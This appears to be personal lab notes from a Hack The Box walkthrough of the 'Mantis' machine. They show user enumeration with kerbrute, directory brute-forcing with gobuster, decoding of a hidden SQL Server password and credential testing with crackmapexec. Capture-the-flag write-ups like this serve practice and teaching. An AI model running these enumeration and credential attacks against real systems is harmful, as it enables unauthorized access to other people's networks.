
```
Domain Name: HTB                                                              
Domain Sid: S-1-5-21-4220043660-4019079961-2895681657
```

```
kerbrute userenum -d htb.local --dc 10.10.10.52 userlist.txt -t 100
```

```
james@htb.local
James@htb.local
administrator@htb.local
mantis@htb.local
JAMES@htb.local
Administrator@htb.local
Mantis@htb.local
```

![[Pasted image 20240515233953.png]]


We have to go Old School as this machine is hard and we need a entry point to get into.
We have 2 domain controller and 3 http sites which simply means that we have to do directory busting.

```
http://10.10.10.52:1337/secure_notes/
```


```
gobuster dir -u http://10.10.10.52:1337 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```
![[Pasted image 20240516003001.png]]

We already have the valid user names so in short we have the usernames and all we need is a password to get into.


```
1. Download OrchardCMS
2. Download SQL server 2014 Express ,create user "admin",and create orcharddb database
3. Launch IIS and add new website and point to Orchard CMS folder location.
4. Launch browser and navigate to http://localhost:8080
5. Set admin password and configure sQL server connection string.
6. Add blog pages with admin user.


Credentials stored in secure format
OrchardCMS admin creadentials 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001
SQL Server sa credentials file namez
```

If you the file names seems fishy to mee
```
ev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt
```


It's some kind of password
```
6d2424716c5f53405f504073735730726421
```
![[Pasted image 20240516005334.png]]


We got the password of the MS-SQL user.
```
m$$ql_S@_P@ssW0rd!
```
![[Pasted image 20240516005420.png]]

I just want to see if we can login with this into smb but failed
```
crackmapexec smb 10.10.10.52 -u ~root/HackTheBox/Mantis/valid_user.txt -p m$$ql_S@_P@ssW0rd!
```


We have to login into the sql server and i have to find the command for it

Tried this command but it didn't worked
```
mysql -h 10.10.10.52 -P 50255 -u admin -p 'm$$ql_S@_P@ssW0rd!'
```

I have installed a GUI base software to handle this stuff
![[Pasted image 20240516011427.png]]


![[Pasted image 20240516013029.png]]


```
Hostname: 10.10.10.52
Database: orcharddb
Password: m$$ql_S@_P@ssW0rd!
```